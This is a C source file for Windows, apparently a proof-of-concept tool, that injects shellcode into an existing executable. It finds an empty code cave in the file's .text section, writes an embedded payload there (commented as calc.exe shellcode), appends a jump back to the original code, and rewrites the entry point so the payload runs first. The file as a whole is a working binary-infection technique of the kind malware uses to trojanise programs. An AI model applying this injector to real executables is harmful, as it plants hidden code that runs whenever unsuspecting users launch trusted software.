#include <windows.h>
#include <stdio.h>

int main() {
    // calc.exe shellcode
    unsigned char payload[] = {
        0x31,0xC0,0x50,0x68,0x63,0x61,0x6C,0x63,0x54,0x59,0x50,0x40,0x92,0x74,0x15,0x51,
        0x64,0x8B,0x72,0x2F,0x8B,0x76,0x0C,0x8B,0x76,0x0C,0xAD,0x8B,0x30,0x8B,0x7E,0x18,
        0xB2,0x50,0xEB,0x1A,0xB2,0x60,0x48,0x29,0xD4,0x65,0x48,0x8B,0x32,0x48,0x8B,0x76,
        0x18,0x48,0x8B,0x76,0x10,0x48,0xAD,0x48,0x8B,0x30,0x48,0x8B,0x7E,0x30,0x03,0x57,
        0x3C,0x8B,0x5C,0x17,0x28,0x8B,0x74,0x1F,0x20,0x48,0x01,0xFE,0x8B,0x54,0x1F,0x24,
        0x0F,0xB7,0x2C,0x17,0x8D,0x52,0x02,0xAD,0x81,0x3C,0x07,0x57,0x69,0x6E,0x45,0x75,
        0xEF,0x8B,0x74,0x1F,0x1C,0x48,0x01,0xFE,0x8B,0x34,0xAE,0x48,0x01,0xF7,0x99,0xFF,
        0xD7
    };
    
    const int payloadSize = sizeof(payload);

    const char* filename = "./test-32.exe";

    HANDLE hFile = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open file\n");
        return 1;
    }

    HANDLE hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    if (hMapFile == NULL) {
        printf("Failed to create file mapping\n");
        return 1;
    }

    LPVOID pMapView = MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (pMapView == NULL) {
        printf("Failed to create map view\n");
        return 1;
    }

    printf("File mapped at: 0x%X\n", pMapView);

    char* pData = (char*)pMapView; // Pointer to the start of the file
    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pData;
    IMAGE_NT_HEADERS* pNtHeader = (IMAGE_NT_HEADERS*)(pData + pDosHeader->e_lfanew); // e_lfanew offset to NT header
    IMAGE_OPTIONAL_HEADER* pOptionalHeader = &pNtHeader->OptionalHeader;
    IMAGE_SECTION_HEADER* textSectionHeader = NULL;

    for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER* section = (IMAGE_SECTION_HEADER*)(pNtHeader + 1) + i;

        if (strcmp((char*)section->Name, ".text") == 0) {
            textSectionHeader = section;

            break;
        }
    }

    if (textSectionHeader == NULL) {
        printf("Failed to find .text section\n");
        return 1;
    }
    
    unsigned char* textRawData = (unsigned char*)(pData + textSectionHeader->PointerToRawData);
    DWORD textSizeRawData = textSectionHeader->SizeOfRawData;

    DWORD originalEntryRVA = pOptionalHeader->AddressOfEntryPoint;
    DWORD originalEntryRaw = textSectionHeader->PointerToRawData + (originalEntryRVA - textSectionHeader->VirtualAddress);
    unsigned char* originalEntryPoint = pData + originalEntryRaw;
    
    printf("Original entry point: 0x%X (Raw: 0x%X)\n", originalEntryRVA, originalEntryRaw);
    
    int caveStartOffset = -1;
    int freeSpaceCount = 0;
    for (int i = 0; i < textSizeRawData; i++) {
        if (textRawData[i] == 0x00) {
            freeSpaceCount++;
            
            if (freeSpaceCount >= payloadSize + 5) {
                caveStartOffset = i - (payloadSize + 5) + 1;
                break;
            }
        } else {
            freeSpaceCount = 0;
        }
    }
    
    if (caveStartOffset == -1) {
        printf("Failed to find cave\n");
        return 1;
    }

    printf("Cave found at address: 0x%X\n", textRawData + caveStartOffset);

    unsigned char jmpBackToEntryPoint[5] = {0xE9, 0, 0, 0, 0};
    DWORD jmpBackOffset = originalEntryRVA - (textSectionHeader->VirtualAddress + caveStartOffset + payloadSize + 5);
    
    memcpy(textRawData + caveStartOffset, payload, payloadSize);
    memcpy(jmpBackToEntryPoint + 1, &jmpBackOffset, sizeof(DWORD));
    memcpy(textRawData + caveStartOffset + payloadSize, jmpBackToEntryPoint, sizeof(jmpBackToEntryPoint));

    pOptionalHeader->AddressOfEntryPoint = textSectionHeader->VirtualAddress + caveStartOffset;
    printf("Patched entry point: 0x%X\n", pOptionalHeader->AddressOfEntryPoint);

    UnmapViewOfFile(pMapView);
    CloseHandle(hMapFile);
    CloseHandle(hFile);
    return 0;
}